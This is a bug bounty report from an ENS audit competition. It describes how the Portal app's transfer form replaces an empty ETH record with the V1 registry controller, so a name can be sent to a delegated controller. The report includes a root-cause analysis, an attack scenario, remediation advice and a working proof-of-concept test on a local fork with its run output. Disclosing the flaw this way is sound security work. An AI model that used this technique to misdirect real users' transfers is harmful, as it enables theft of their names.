# 92902 w a critical portal treats an empty eth record as a v1 controller resolution and transfers to the wrong recipient

**Submitted on Sep 13th 2026 at 05:30:08 UTC by @kl4r10n for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92902
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Portal uses a resolver helper originally written for granting roles as the resolver for the NFT transfer-recipient field. When an entered ENS name has no ETH address record, that helper does not return “unresolved.” Instead, it falls back to the name's ownership address.

That fallback is unsafe for V1 unwrapped `.eth` names because such a name has two different principals:

* `registrant`: owner of the registrar ERC-721, i.e. the long-term name owner; and
* `owner`: owner in the ENS registry, i.e. the record controller/manager.

ENSJS returns both. Portal's shared `resolveEnsOwner()` adapter discards `registrant` and retains only `owner`. Consequently, if Bob owns `legitimate-recipient.eth` at the registrar but has delegated its V1 registry controller to Mallory, and the name has no ETH address record, entering `legitimate-recipient.eth` into the transfer form resolves to Mallory.

The form classifies this fallback as a successful address resolution, enables **Transfer name**, and ultimately ABI-encodes Mallory as the `to` argument of the V2 registry's ERC-1155 `safeTransferFrom`. Alice intends to transfer the token, but the application selects Mallory instead of the recipient identified by the entered name.

## Root cause

### 1. A role-grant-specific fallback is reused for value-bearing recipients

`apps/portal/src/features/roles/helpers/addUser.handlers.ts:19-36` first performs normal forward resolution. If that returns no ETH address, it substitutes the ENS ownership address:

```ts
const resolved = await getEnsAddress(client, {
  name: nameOrAddress,
  universalResolverAddress,
})

let resolvedAddress = resolved

// Fallback for names that do not set an address record:
// use current ENS owner address so the role can still be granted.
if (!resolvedAddress) {
  const ownerResult = await getEnsOwner({ name: nameOrAddress })
  if (ownerResult.isOk()) {
    resolvedAddress = ownerResult.value?.owner ?? null
  }
}

return resolvedAddress
```

The comment explains the original role-grant use case. That policy is not safe for a transfer-recipient field: an ENS name without an ETH address is unresolved and must not acquire an unrelated ownership-based meaning.

### 2. Portal discards the V1 registrant and keeps the delegated controller

For an unwrapped V1 second-level `.eth` name, ENSJS `getOwner` returns an object of this form:

```ts
{
  registrant: registrarOwner,
  owner: registryOwner,
  ownershipLevel: 'registrar',
}
```

The dependency documents these fields as “the registrant is the owner of the NFT” and “the owner is the controller of the records.”

However, `apps/portal/src/utils/ens/resolveEnsOwner.ts:95-101` reduces that object to `v1Owner.owner`:

```ts
const v1Owner = await getOwnerV1(client, { name })
if (v1Owner?.owner && v1Owner.owner !== zeroAddress) {
  return {
    owner: v1Owner.owner,
    registryAddress: v1EthRegistry,
    protocolVersion: 'ENSv1',
  }
}
```

That reduction may be suitable for record-management authorization, but it is unsafe as a substitute for a missing payment/NFT recipient record.

### 3. Transfer resolution treats the fallback as a valid forward resolution

`apps/portal/src/features/address/queries/getResolvedAddress.ts:6,13-31` imports that same helper for all “name or address” fields, explicitly including the ownership fallback.

`apps/portal/src/features/address/hooks/useAddressResolution.ts:67-88` then marks every non-null result as `resolved`:

```ts
.with({ resolved: P.nonNullable }, () => 'resolved' as const)

return {
  address: status === 'resolved' ? resolved : null,
  // ...
}
```

The result carries no provenance such as `forward-record`, `registrant`, or `controller`, so downstream callers cannot enforce a stricter recipient policy.

### 4. The transfer form accepts the controller and starts the transfer

`apps/portal/src/features/transfer/components/SendNameForm.tsx:81-108` accepts any non-null, non-self, non-zero result:

```ts
const resolution = useAddressResolution(recipientInput)
const { address: recipient, isResolving } = resolution

const hasValidRecipient = !!recipient && !isSelf && !isZeroAddress
// ...
const runTransfer = () => {
  if (!recipient || !canStart) return
  startTransfer({ recipient, options: effectiveOptions })
}
```

The page does render the selected address below the input and warns the user to check it. It does **not**, however, state that forward resolution failed or that the displayed address is only the name's delegated V1 controller. The typed legitimate ENS name remains the user's semantic recipient. The transaction modal then lists only steps such as `Transfer name`; it does not repeat the selected recipient address (`useTransferName.ts:174-180`).

### 5. The fallback becomes the NFT recipient without another binding check

`apps/portal/src/features/transfer/helpers/transferToken.ts:67-82` directly inserts the selected address into `safeTransferFrom`:

```ts
const data = encodeFunctionData({
  abi: erc1155Abi,
  functionName: 'safeTransferFrom',
  args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'],
})
```

There is no final forward-resolution check and no binding between the user-entered name and the transaction recipient.

## Attack scenario

1. Bob is the registrar/ERC-721 owner (`registrant`) of the legitimate V1 name `legitimate-recipient.eth`.
2. Bob delegates the V1 registry owner/controller to Mallory for record management. This is a normal V1 configuration; it does not transfer the registrar NFT to Mallory.
3. The name has a working resolver, but its ETH address record is empty. Therefore `getEnsAddress` completes normally with `null`. If resolution instead throws, such as for a missing resolver, the helper's outer `catch` returns `null` and the fallback is not reached.
4. Mallory asks Alice to transfer Alice's valuable V2 ENS name to Bob at `legitimate-recipient.eth`.
5. Alice enters that name in Portal's transfer form.
6. Forward resolution returns `null`. Portal falls back to ownership resolution.
7. V1 ownership resolution contains `registrant = Bob` and `owner = Mallory`. Portal discards Bob and returns Mallory.
8. The form marks the name as resolved and enables the transfer. It shows Mallory's checksummed address in full and, if available, Mallory's primary name. It does not say that forward resolution failed or that the address is a delegated controller rather than Bob. A user who independently knows Bob's address can catch the mismatch; a user who knows Bob through the ENS name cannot.
9. Alice starts the flow and approves the ERC-1155 transfer in her connected wallet.
10. The V2 registry transfers Alice's ENS name token directly to Mallory.

Mallory now owns Alice's transferred name even though Bob was the intended recipient. The transfer itself is valid on-chain and cannot be undone by the application.

### Why this is not merely normal controller authority

A V1 controller can intentionally set the name's ETH address record to Mallory. If that happens, normal ENS clients resolve the name to Mallory; that is ordinary ENS authority and is not this finding.

Here, the ETH address record remains empty:

* standard forward resolution returns `null`;
* clients that require an address record fail closed and treat the name as unresolved; but
* Portal alone converts the empty result into Mallory's controller address and labels it `resolved`.

The vulnerability is the Portal-only fallback that changes the meaning of an unresolved recipient name. Mallory does not need to publish an attacker address through the name's standard resolution record.

## Why this is not a known issue or duplicate

| Known item                                                               | Why this finding is different                                                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| QA-01 — transfers with certain role combinations break follow-up actions | QA-01 describes errors after a transfer. This finding changes the recipient before the transfer and causes the transfer itself to succeed to an attacker. The known-issues document explicitly says a demonstrated role combination that grants unintended authority is a new security finding. |
| WEB-1305 — transferring roles to a V1 name hangs                         | That issue concerns role-transfer liveness. This finding concerns transfer of a V2 name's ERC-1155 ownership token, and the malicious transaction succeeds.                                                                                                                                     |
| EXP-INPUT-005 — deceptive ENS characters                                 | No homoglyph, bidi character, control character, or normalization discrepancy is required. The input can be an ordinary ASCII `.eth` name.                                                                                                                                                      |
| R2-03 / R2-06 — session scope and revocation                             | No HCA session is used or compromised. The victim signs an incorrectly constructed transfer from their connected wallet.                                                                                                                                                                        |
| ENS-01 — old roles survive a transfer                                    | ENS-01 concerns authority retained after a transfer to the intended recipient. Here, the NFT is transferred to the wrong recipient in the first place.                                                                                                                                          |

The root cause is a cross-context policy reuse: an explicit owner fallback written so “the role can still be granted” is consumed by a value-bearing NFT recipient field without preserving the resolution source.

## Recommended remediation

1. Do not use ownership fallback for transfers, payments, approvals, or any other value-bearing recipient field. For those contexts, accept only:
   * a literal address; or
   * a non-null ETH address record returned by forward resolution.
2. Keep any owner/controller fallback confined to role-grant flows where it is an intentional, separately reviewed policy.
3. Change the shared resolution result from `Address | null` to a tagged result, for example:

```ts
type ResolvedRecipient =
  | { source: 'literal-address'; address: Address }
  | { source: 'eth-address-record'; address: Address }
  | { source: 'v1-registrant'; address: Address }
  | { source: 'registry-controller'; address: Address }
```

Then require `literal-address` or `eth-address-record` in `SendNameForm`. 4. If an ENS name has no ETH address record, render it as unresolved and keep the transfer button disabled. Explain that ownership and record-controller addresses are not substitutes for an address record. 5. Repeat the exact checksummed recipient address and its resolution source in the final transaction modal before starting the wallet request. 6. Add regression tests covering V1 names where `registrant !== owner`, including the no-address-record case.

## Suggested regression assertion

```ts
expect(
  await resolveTransferRecipient('legitimate-recipient.eth'),
).toEqual({ status: 'unresolved', address: null })
```

The role-grant resolver can retain an explicitly named `resolveRoleGrantee` policy if product requirements require the controller fallback.

## Proof of Concept

## Proof of concept

Add the following file as:

`apps/portal/src/features/transfer/F05OwnerFallbackRecipient.poc.test.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import {
  bytesToHex,
  createPublicClient,
  createTestClient,
  createWalletClient,
  erc1155Abi,
  http,
  keccak256,
  namehash,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { mnemonicToAccount, privateKeyToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { describe, expect, it } from 'vitest'
import { createEOASigner } from '@/features/registry/utils/signer.helpers'
import { resolveAddressOrName } from '@/features/roles/helpers/addUser.handlers'
import { universalResolverAddress } from '@/lib/constants/universalResolver'
import { sepoliaWithEns } from '@/lib/wagmi'
import { resolveEnsOwner } from '@/utils/ens/resolveEnsOwner'
import { getLabel } from '@/utils/token/getLabel'
import { transferToken } from './helpers/transferToken'

const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const MNEMONIC = 'test test test test test test test test test test test junk'

const localSepoliaWithEns = {
  ...sepoliaWithEns,
  rpcUrls: {
    default: { http: [ANVIL_RPC_URL] },
    public: { http: [ANVIL_RPC_URL] },
  },
} as const

const publicClient = createPublicClient({
  chain: localSepoliaWithEns,
  transport: http(ANVIL_RPC_URL),
})
const testClient = createTestClient({
  chain: localSepoliaWithEns,
  transport: http(ANVIL_RPC_URL),
  mode: 'anvil',
})

function deriveAccount(index: number) {
  const privateKey = mnemonicToAccount(MNEMONIC, {
    addressIndex: index,
  }).getHdKey().privateKey
  if (!privateKey) throw new Error(`No private key at mnemonic index ${index}`)
  return privateKeyToAccount(bytesToHex(privateKey))
}

const ALICE = deriveAccount(0)
const BOB = deriveAccount(1)
const MALLORY = deriveAccount(2)

const aliceWallet = createWalletClient({
  account: ALICE,
  chain: localSepoliaWithEns,
  transport: http(ANVIL_RPC_URL),
})
const bobWallet = createWalletClient({
  account: BOB,
  chain: localSepoliaWithEns,
  transport: http(ANVIL_RPC_URL),
})

const ensRegistryWriteAbi = parseAbi([
  'function setResolver(bytes32 node, address resolver)',
  'function setOwner(bytes32 node, address owner)',
])
const ensRegistryReadAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function resolver(bytes32 node) view returns (address)',
])

const V1_REGISTRAR_CONTROLLER =
  localSepoliaWithEns.contracts.ensEthRegistrarController.address
const V1_ENS_REGISTRY = localSepoliaWithEns.contracts.ensLegacyRegistry.address
const V1_BASE_REGISTRAR =
  localSepoliaWithEns.contracts.ensBaseRegistrarImplementation.address
const V1_PUBLIC_RESOLVER =
  localSepoliaWithEns.contracts.ensPublicResolver.address

const registrarControllerWallet = createWalletClient({
  account: V1_REGISTRAR_CONTROLLER,
  chain: localSepoliaWithEns,
  transport: http(ANVIL_RPC_URL),
})

const baseRegistrarAbi = parseAbi([
  'function owner() view returns (address)',
  'function controllers(address controller) view returns (bool)',
  'function addController(address controller)',
  'function register(uint256 id, address owner, uint256 duration) returns (uint256)',
])

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])

const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])

const ensContracts = ensL1Contracts[supportedL1Chains.sepolia]
const V2_REGISTRAR = ensContracts.ensEthRegistrar.address
const TEST_USDC = ensContracts.usdc.address
const REGISTRATION_DURATION = 28n * 24n * 60n * 60n
const V1_REGISTRATION_DURATION = 365n * 24n * 60n * 60n

async function registerV1Name(label: string): Promise<string> {
  const controllerIsAuthorized = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'controllers',
    args: [V1_REGISTRAR_CONTROLLER],
  })

  // The latest Sepolia controller is not necessarily authorized by the legacy
  // BaseRegistrar at the fork block. Grant it controller status locally using
  // the real Ownable entry point, solely to construct the required V1 state.
  if (!controllerIsAuthorized) {
    const baseRegistrarOwner = await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'owner',
    })
    await testClient.impersonateAccount({ address: baseRegistrarOwner })
    await testClient.setBalance({
      address: baseRegistrarOwner,
      value: 10n ** 18n,
    })
    const ownerWallet = createWalletClient({
      account: baseRegistrarOwner,
      chain: localSepoliaWithEns,
      transport: http(ANVIL_RPC_URL),
    })
    const authorizeHash = await ownerWallet.writeContract({
      address: V1_BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'addController',
      args: [V1_REGISTRAR_CONTROLLER],
    })
    await publicClient.waitForTransactionReceipt({ hash: authorizeHash })
    await testClient.stopImpersonatingAccount({ address: baseRegistrarOwner })
  }

  expect(
    await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'controllers',
      args: [V1_REGISTRAR_CONTROLLER],
    }),
  ).toBe(true)

  // Fork-only fixture setup: impersonate the controller that the deployed
  // BaseRegistrar already authorizes. Registration still executes the real
  // canonical BaseRegistrar and Registry contracts; no contract is mocked.
  await testClient.impersonateAccount({ address: V1_REGISTRAR_CONTROLLER })
  await testClient.setBalance({
    address: V1_REGISTRAR_CONTROLLER,
    value: 10n ** 18n,
  })
  const registerHash = await registrarControllerWallet.writeContract({
    address: V1_BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'register',
    args: [
      BigInt(keccak256(toHex(label))),
      BOB.address,
      V1_REGISTRATION_DURATION,
    ],
  })
  await publicClient.waitForTransactionReceipt({ hash: registerHash })
  await testClient.stopImpersonatingAccount({
    address: V1_REGISTRAR_CONTROLLER,
  })
  return `${label}.eth`
}

async function registerV2Name(label: string): Promise<string> {
  const secret = keccak256(toHex(`f05:${label}`))
  const commitment = await publicClient.readContract({
    address: V2_REGISTRAR,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      ALICE.address,
      secret,
      zeroAddress,
      V1_PUBLIC_RESOLVER,
      REGISTRATION_DURATION,
      zeroHash,
    ],
  })

  const mintHash = await aliceWallet.writeContract({
    address: TEST_USDC,
    abi: erc20Abi,
    functionName: 'mint',
    args: [ALICE.address, 10_000_000_000n],
  })
  await publicClient.waitForTransactionReceipt({ hash: mintHash })

  const commitHash = await aliceWallet.writeContract({
    address: V2_REGISTRAR,
    abi: registrarAbi,
    functionName: 'commit',
    args: [commitment],
  })
  await publicClient.waitForTransactionReceipt({ hash: commitHash })

  const minAge = await publicClient.readContract({
    address: V2_REGISTRAR,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: V2_REGISTRAR,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [label, REGISTRATION_DURATION, TEST_USDC],
  })
  const approveHash = await aliceWallet.writeContract({
    address: TEST_USDC,
    abi: erc20Abi,
    functionName: 'approve',
    args: [V2_REGISTRAR, (base + premium) * 2n],
  })
  await publicClient.waitForTransactionReceipt({ hash: approveHash })

  const registerHash = await aliceWallet.writeContract({
    address: V2_REGISTRAR,
    abi: registrarAbi,
    functionName: 'register',
    args: [
      label,
      ALICE.address,
      secret,
      zeroAddress,
      V1_PUBLIC_RESOLVER,
      REGISTRATION_DURATION,
      TEST_USDC,
      zeroHash,
    ],
  })
  await publicClient.waitForTransactionReceipt({ hash: registerHash })
  return `${label}.eth`
}

const runNoMockPoc = process.env.RUN_F05_NO_MOCK === '1'

describe.skipIf(!runNoMockPoc)(
  'F-05 no-mock PoC: empty ETH record falls back to V1 controller',
  () => {
    it('resolves and transfers to the controller instead of the registrant', async () => {
      // Use real ENS contracts on the local Sepolia fork. Bob registers a
      // fresh, unwrapped V1 name, assigns a resolver but leaves addr(60)
      // empty, then delegates only its registry controller to Mallory.
      await Promise.all(
        [ALICE.address, BOB.address, MALLORY.address].map((address) =>
          testClient.setCode({ address, bytecode: '0x' }),
        ),
      )

      const recipientName = await registerV1Name(`f05-recipient-${Date.now()}`)
      const recipientNode = namehash(recipientName)

      const setResolverHash = await bobWallet.writeContract({
        address: V1_ENS_REGISTRY,
        abi: ensRegistryWriteAbi,
        functionName: 'setResolver',
        args: [recipientNode, V1_PUBLIC_RESOLVER],
      })
      await publicClient.waitForTransactionReceipt({ hash: setResolverHash })

      const setControllerHash = await bobWallet.writeContract({
        address: V1_ENS_REGISTRY,
        abi: ensRegistryWriteAbi,
        functionName: 'setOwner',
        args: [recipientNode, MALLORY.address],
      })
      await publicClient.waitForTransactionReceipt({ hash: setControllerHash })

      // These are real Universal Resolver and ENSJS reads. Standard forward
      // resolution is empty, while V1 ownership has distinct principals.
      const forwardAddress = await getEnsAddress(publicClient, {
        name: recipientName,
        universalResolverAddress,
      })
      const v1Ownership = await getOwnerV1(publicClient, {
        name: recipientName,
      })
      const directRegistryOwner = await publicClient.readContract({
        address: V1_ENS_REGISTRY,
        abi: ensRegistryReadAbi,
        functionName: 'owner',
        args: [recipientNode],
      })

      console.log('F-05 V1 fixture evidence', {
        recipientName,
        configuredLegacyRegistry:
          localSepoliaWithEns.contracts.ensLegacyRegistry.address,
        fixtureLegacyRegistry: V1_ENS_REGISTRY,
        configuredBaseRegistrar:
          localSepoliaWithEns.contracts.ensBaseRegistrarImplementation.address,
        directRegistryOwner,
        v1Ownership,
        forwardAddress,
      })

      expect(forwardAddress).toBeNull()
      expect(v1Ownership).toMatchObject({
        registrant: BOB.address,
        owner: MALLORY.address,
        ownershipLevel: 'registrar',
      })

      // Run Portal's production cross-version owner adapter and the actual
      // recipient resolver consumed by SendNameForm.
      const portalOwner = await resolveEnsOwner(publicClient, recipientName)
      const selectedRecipient = await resolveAddressOrName({
        client: publicClient,
        nameOrAddress: recipientName,
      })

      expect(portalOwner).toMatchObject({
        owner: MALLORY.address,
        protocolVersion: 'ENSv1',
      })
      expect(selectedRecipient).toBe(MALLORY.address)
      if (!selectedRecipient || !portalOwner)
        throw new Error('Portal did not produce the vulnerable recipient')

      // Register a real V2 name to Alice through the deployed V2 registrar.
      const transferredName = await registerV2Name(`f05-victim-${Date.now()}`)

      const v2Ownership = await resolveEnsOwner(publicClient, transferredName)
      expect(v2Ownership).toMatchObject({
        owner: ALICE.address,
        protocolVersion: 'ENSv2',
      })
      if (!v2Ownership)
        throw new Error('Could not resolve the freshly registered V2 name')

      const tokenId = await getTokenId(publicClient, {
        label: getLabel(transferredName),
        registryAddress: v2Ownership.registryAddress,
      })

      expect(
        await publicClient.readContract({
          address: v2Ownership.registryAddress,
          abi: erc1155Abi,
          functionName: 'balanceOf',
          args: [ALICE.address, tokenId],
        }),
      ).toBe(1n)

      // Execute the real production transfer helper and transaction manager.
      // This signs, broadcasts and mines safeTransferFrom on the fork.
      const result = await transferToken({
        name: transferredName,
        registryAddress: v2Ownership.registryAddress,
        tokenId,
        recipient: selectedRecipient,
        walletClient: aliceWallet,
        publicClient,
        signer: createEOASigner(aliceWallet),
        chainId: localSepoliaWithEns.id,
        id: `f05-no-mock-${Date.now()}`,
      })

      const [aliceBalanceAfter, malloryBalanceAfter] = await Promise.all([
        publicClient.readContract({
          address: v2Ownership.registryAddress,
          abi: erc1155Abi,
          functionName: 'balanceOf',
          args: [ALICE.address, tokenId],
        }),
        publicClient.readContract({
          address: v2Ownership.registryAddress,
          abi: erc1155Abi,
          functionName: 'balanceOf',
          args: [MALLORY.address, tokenId],
        }),
      ])

      expect(aliceBalanceAfter).toBe(0n)
      expect(malloryBalanceAfter).toBe(1n)

      console.log('F-05 no-mock execution evidence', {
        rpc: ANVIL_RPC_URL,
        recipientName,
        forwardAddressRecord: forwardAddress,
        v1Registrant: v1Ownership?.registrant,
        v1Controller: v1Ownership?.owner,
        portalSelectedRecipient: selectedRecipient,
        transferredName,
        registryAddress: v2Ownership.registryAddress,
        tokenId: tokenId.toString(),
        transactionHash: result.hash,
        aliceBalanceAfter: aliceBalanceAfter.toString(),
        malloryBalanceAfter: malloryBalanceAfter.toString(),
      })
    }, 240_000)
  },
)
```

### Run instructions

Start a local Sepolia fork from the repository root:

```sh
anvil \
  --fork-url https://ethereum-sepolia-rpc.publicnode.com \
  --chain-id 11155111 \
  --port 8545 \
  --host 127.0.0.1
```

In a second terminal, run from `apps/portal`:

```sh
NODE_OPTIONS=--no-webstorage \
RUN_F05_NO_MOCK=1 \
VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8545 \
ANVIL_RPC_URL=http://127.0.0.1:8545 \
pnpm exec vitest run \
  src/features/transfer/F05OwnerFallbackRecipient.poc.test.ts \
  --reporter=verbose
```

`NODE_OPTIONS=--no-webstorage` prevents Node's experimental global Web Storage implementation from shadowing Vitest's browser storage shim. It does not alter application or contract behavior.

### Why the fork impersonation is not mocking the vulnerability

The fork-only impersonation is used solely to create a fresh legacy V1 name without depending on public-testnet funds, commitment age, pricing, or an existing third-party name. It calls the deployed BaseRegistrar's real `addController` and `register` functions and stops impersonating before the vulnerable resolution and transfer begin.

It does not replace or stub any security-relevant result. The following all execute unmodified production/deployed code:

1. Universal Resolver returns `null` for the empty ETH address record.
2. ENSJS returns Bob as `registrant` and Mallory as V1 registry `owner`.
3. Portal's `resolveEnsOwner` discards Bob.
4. Portal's `resolveAddressOrName` selects Mallory.
5. The V2 registrar issues a real ERC-1155 token to Alice.
6. Portal's `transferToken` and the real transaction manager sign and mine `safeTransferFrom`.
7. On-chain balances change from Alice to Mallory.

## Execution result

The following is the relevant output from an actual run; local absolute paths and unrelated library initialization messages are omitted:

```
RUN  v4.1.5 apps/portal

F-05 V1 fixture evidence {
  recipientName: 'f05-recipient-1789277187912.eth',
  configuredLegacyRegistry: '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e',
  fixtureLegacyRegistry: '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e',
  configuredBaseRegistrar: '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85',
  directRegistryOwner: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
  v1Ownership: {
    registrant: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
    owner: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
    ownershipLevel: 'registrar'
  },
  forwardAddress: null
}

[TRANSACTION MANAGER] Transaction state: submitting
[TRANSACTION MANAGER] Transaction state: pending
[TRANSACTION MANAGER] Transaction state: success

F-05 no-mock execution evidence {
  rpc: 'http://127.0.0.1:8545',
  recipientName: 'f05-recipient-1789277187912.eth',
  forwardAddressRecord: null,
  v1Registrant: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  v1Controller: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
  portalSelectedRecipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
  transferredName: 'f05-victim-1789277188519.eth',
  registryAddress: '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2',
  tokenId: '71823619090220020255551007359350811239241442266285769286373702565183927353344',
  transactionHash: '0x58e6b1e94751b6aacc58c24d1ef2549368aa9c0432985901f8797b255ae5acd6',
  aliceBalanceAfter: '0',
  malloryBalanceAfter: '1'
}

Test Files  1 passed (1)
Tests       1 passed (1)
```

This demonstrates the complete exploit consequence, not merely calldata construction: standard forward resolution is empty, the application's selected recipient is the delegated controller, and the mined transfer moves the victim's V2 ENS token from Alice to Mallory.
